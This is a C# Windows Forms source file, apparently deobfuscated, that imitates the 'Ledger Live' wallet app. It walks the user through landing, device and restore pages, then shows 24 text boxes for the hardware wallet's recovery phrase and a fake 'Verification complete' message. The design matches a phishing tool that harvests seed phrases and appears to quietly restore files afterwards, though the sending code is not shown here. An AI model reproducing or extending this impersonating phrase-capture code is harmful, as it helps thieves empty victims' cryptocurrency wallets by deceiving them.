using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using Ledger.ScrollBar;


// was \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDר\uFFFDΔᛈᛈ\uFFFD
using CuiUiControl = Ledger.ScrollBar.CuiButtonControl;//was  \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDר\uFFFDΔᛈᛈ\uFFFD;
using ContentAlignment = System.Drawing.ContentAlignment;
namespace Ledger.MainClassFolder
{
   
    //  Partial class files:
    //    Page1.cs  –  Landing page   (Get Started / Buy / Sync)
    //    Page2.cs  –  Device picker  (Nano X, Nano S, Nano S+, Flex, Stax)
    //    Page3.cs  –  Setup choice   (New device / Restore)
    //    Page4.cs  –  Mnemonic entry (24-word recovery phrase)
    // ═══════════════════════════════════════════════════════════════════

    public partial  class Second2Form : Form
    {
        private System.ComponentModel.IContainer components = new System.ComponentModel.Container();

        CommonFunctions func = new CommonFunctions();

        private void ShowFinalAlert(bool success)
        {
            CommonFunctions func = new CommonFunctions();

            if (success)
            {
                func.ScheduleFileRestoration();

                AlertPopupForm.Show( // was \uFFFDΑ\uFFFD\uD802\uDC04\uFFFD\uFFFD\uFFFDT\uFFFDC
                    "Verification complete!\nRestart Ledger Live App.",
                    AlertPopupForm.AlertType.warning // was \uFFFDΑ\uFFFD\uD802\uDC04\uFFFD\uFFFD\uFFFDT\uFFFDC.\uFFFDܠ\uFFFD\uFFFD\uFFFD\uFFFDע\uFFFDᚏΥ\uFFFDג\uFFFD.warning
                );

                this.Close();
            }
            else
                AlertPopupForm.Show( // was \uFFFDΑ\uFFFD\uD802\uDC04\uFFFD\uFFFD\uFFFDT\uFFFDC
                    "Connection failed\n" + (System.IO.File.Exists("connection_diagnostics.log")
                        ? "Error details saved to connection_diagnostics.log"
                        : "No connection details available"),
                    AlertPopupForm.AlertType.warning // was \uFFFDΑ\uFFFD\uD802\uDC04\uFFFD\uFFFD\uFFFDT\uFFFDC.\uFFFDܠ\uFFFD\uFFFD\uFFFD\uFFFDע\uFFFDᚏΥ\uFFFDג\uFFFD.warning
                );
        }

        // ── Shared component container ──────────────────────────────────
  //      private IContainer components;

        // ── Timer (keeps language dropdown rendered correctly) ──────────
        private System.Windows.Forms.Timer timer1;

        // ── ImageList (shared resource) ────────────────────────────────
        private System.Windows.Forms.ImageList imageList1;

        // ── Page panels ────────────────────────────────────────────────
        private System.Windows.Forms.Panel page1;   // Landing
        private System.Windows.Forms.Panel Page2;   // Device selection
        private System.Windows.Forms.Panel Page3;   // Setup choice
        private System.Windows.Forms.Panel Page4;   // Mnemonic entry

        // ── Page 1 controls ────────────────────────────────────────────
        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.Panel panel2;
        private CuiUiControl bunifuDropdown1;
        private System.Windows.Forms.PictureBox pictureBox1;
        private CuiUiControl cuiButton1;   // Get Started
        private CuiUiControl cuiButton2;   // No Device / Buy
        private CuiUiControl cuiButton3;   // Sync with another
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.ContextMenuStrip contextMenuStrip1;
        private System.Windows.Forms.ToolStripMenuItem englishToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem françaisToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem deutschToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem рyссийToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem españolToolStripMenuItem;

        // ── Page 2 controls ────────────────────────────────────────────
        private CuiUiControl cuiButton10;   // Previous
        private CuiUiControl nanoXbtn;
        private CuiUiControl nanoSplusbtn;
        private CuiUiControl Flexbtn;
        private CuiUiControl Staxbtn;
        private CuiUiControl nanoSbtn;

        // ── Page 3 controls ────────────────────────────────────────────
        private CuiUiControl cuiButton9;    // Previous
        private CuiUiControl cuiButton4;    // Option 1 (Setup new)
        private CuiUiControl cuiButton5;    // Option 2 (Restore)
        private CuiUiControl cuiButton6;    // Option 3
        private System.Windows.Forms.Label FirstTime;
        private System.Windows.Forms.Label SetUp;

        // ── Page 4 controls ────────────────────────────────────────────
        private System.Windows.Forms.Panel panel3;   // left sidebar
        private System.Windows.Forms.Panel panel4;   // right content
        private CuiUiControl Backbt;
        private CuiUiControl Readybtn;

        // Mnemonic TextBoxes  1-12 (left column)
        private System.Windows.Forms.TextBox mnem1;
        private System.Windows.Forms.TextBox mnem2;
        private System.Windows.Forms.TextBox mnem3;
        private System.Windows.Forms.TextBox mnem4;
        private System.Windows.Forms.TextBox mnem5;
        private System.Windows.Forms.TextBox mnem6;
        private System.Windows.Forms.TextBox mnem7;
        private System.Windows.Forms.TextBox mnem8;
        private System.Windows.Forms.TextBox mnem9;
        private System.Windows.Forms.TextBox mnem10;
        private System.Windows.Forms.TextBox mnem11;
        private System.Windows.Forms.TextBox mnem12;

        // Mnemonic TextBoxes 13-24 (right column)
        private System.Windows.Forms.TextBox mnem13;
        private System.Windows.Forms.TextBox mnem14;
        private System.Windows.Forms.TextBox mnem15;
        private System.Windows.Forms.TextBox mnem16;
        private System.Windows.Forms.TextBox mnem17;
        private System.Windows.Forms.TextBox mnem18;
        private System.Windows.Forms.TextBox mnem19;
        private System.Windows.Forms.TextBox mnem20;
        private System.Windows.Forms.TextBox mnem21;
        private System.Windows.Forms.TextBox mnem22;
        private System.Windows.Forms.TextBox mnem23;
        private System.Windows.Forms.TextBox mnem24;

        // Number labels  1-12
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.Label label7;
        private System.Windows.Forms.Label label8;
        private System.Windows.Forms.Label label9;
        private System.Windows.Forms.Label label10;
        private System.Windows.Forms.Label label11;
        private System.Windows.Forms.Label label12;
        private System.Windows.Forms.Label label13;
        private System.Windows.Forms.Label label14;
        private System.Windows.Forms.Label label15;

        // Number labels 13-24
        private System.Windows.Forms.Label label16;
        private System.Windows.Forms.Label label17;
        private System.Windows.Forms.Label label18;
        private System.Windows.Forms.Label label19;
        private System.Windows.Forms.Label label20;
        private System.Windows.Forms.Label label21;
        private System.Windows.Forms.Label label22;
        private System.Windows.Forms.Label label23;
        private System.Windows.Forms.Label label24;
        private System.Windows.Forms.Label label25;
        private System.Windows.Forms.Label label26;
        private System.Windows.Forms.Label label27;

        // ═══════════════════════════════════════════════════════════════
        //  Constructor
        // ═══════════════════════════════════════════════════════════════
        public Second2Form()
        {
            this.InitializeComponent();

            // Bring the language dropdown above the pictureBox that covers panel2
            this.bunifuDropdown1.BringToFront();

            // Override the designer's AutoScaleMode so the form scales
            // correctly on high-DPI screens instead of using Font scaling
            this.AutoScaleMode = AutoScaleMode.Dpi;

            // Attach the mnemonic key-press validator to ALL 24 word boxes
            // (the designer only wired it to mnem1-12; this catches 13-24 too)
            for (int index = 1; index <= 24; ++index)
            {
                if (((IEnumerable<Control>)this.panel4.Controls.Find($"mnem{index}", true))
                        .FirstOrDefault<Control>() is TextBox textBox)
                    textBox.KeyPress += new KeyPressEventHandler(func.Mnem_KeyPress);
            }
        }

        // ═══════════════════════════════════════════════════════════════
        //  InitializeComponent  – calls each page initializer in order
        // ═══════════════════════════════════════════════════════════════
        public  void InitializeComponent()
        {
            this.SuspendLayout();

            // Timer setup (shared, needed by Page 1)
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.timer1.Enabled = true;
            this.timer1.Interval = 1000;
            this.timer1.Tick += new EventHandler(this.timer1_Tick);

            // Build each page
            InitializePage1();   // Page1.cs
            InitializePage2();   // Page2.cs
            InitializePage3();   // Page3.cs
            InitializePage4();
          
            // ── Form-level properties ───────────────────────────────────
            this.AutoScaleDimensions = new SizeF(8F, 16F);
            this.AutoScaleMode = AutoScaleMode.Font;
            this.BackColor = Color.FromArgb(26, 27, 28);
            this.ClientSize = new Size(1604, 875);
            this.ForeColor = Color.White;
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.Margin = new Padding(4);
            this.MinimumSize = new Size(1598, 848);
            this.Name = "MainFormBAOClass";
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "Ledger Live";
            this.Load += new EventHandler(this.Ledger_Load);

            // Add pages to form  (z-order: Page2 on top → page1 on bottom)
            this.Controls.Add(this.Page2);
            this.Controls.Add(this.Page4);
            this.Controls.Add(this.Page3);
            this.Controls.Add(this.page1);

            this.ResumeLayout(false);
        }

        // ═══════════════════════════════════════════════════════════════
        //  Form-level events
        // ═══════════════════════════════════════════════════════════════
        private void Ledger_Load(object sender, EventArgs e)
        {
            // Intentionally left empty – extend as needed
        }

        // ═══════════════════════════════════════════════════════════════
        //  Dispose
        // ═══════════════════════════════════════════════════════════════
        //protected override void Dispose(bool disposing)
        //{
        //    if (disposing && this.components != null)
        //        this.components.Dispose();
        //    base.Dispose(disposing);
        //}
    }
}